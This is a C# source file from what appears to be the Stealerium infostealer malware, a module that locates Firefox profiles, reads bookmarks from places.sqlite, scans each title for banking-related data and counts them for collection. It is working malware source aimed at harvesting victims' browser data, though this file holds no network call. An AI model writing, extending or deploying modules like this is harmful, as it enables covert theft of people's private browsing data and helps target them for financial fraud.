using System;
using System.Collections.Generic;
using System.IO;
using Stealerium.Helpers;
using Stealerium.Target.Browsers.Chromium;

namespace Stealerium.Target.Browsers.Firefox
{
    internal class CBookmarks
    {
        // Get cookies.sqlite file location
        private static string GetBookmarksDbPath(string path)
        {
            try
            {
                var dir = path + "\\Profiles";
                if (Directory.Exists(dir))
                    foreach (var sDir in Directory.GetDirectories(dir))
                        if (File.Exists(sDir + "\\places.sqlite"))
                            return sDir + "\\places.sqlite";
            }
            catch (Exception ex)
            {
                Logging.Log("Firefox >> Failed to find bookmarks\n" + ex);
            }

            return null;
        }

        // Get bookmarks from gecko browser
        public static List<Bookmark> Get(string path)
        {
            var scBookmark = new List<Bookmark>();
            try
            {
                var sCookiePath = GetBookmarksDbPath(path);
                // Read data from table
                var sSqLite = SqlReader.ReadTable(sCookiePath, "moz_bookmarks");
                if (sSqLite == null) return scBookmark;

                for (var i = 0; i < sSqLite.GetRowCount(); i++)
                {
                    var bBookmark = new Bookmark
                    {
                        Title = Crypto.GetUtf8(sSqLite.GetValue(i, 5))
                    };

                    if (!Crypto.GetUtf8(sSqLite.GetValue(i, 1)).Equals("0") || bBookmark.Title == "0") continue;
                    // Analyze value
                    Banking.ScanData(bBookmark.Title);
                    Counter.Bookmarks++;
                    scBookmark.Add(bBookmark);
                }
            }
            catch (Exception ex)
            {
                Logging.Log("Firefox >> bookmarks collection failed\n" + ex);
            }

            return scBookmark;
        }
    }
}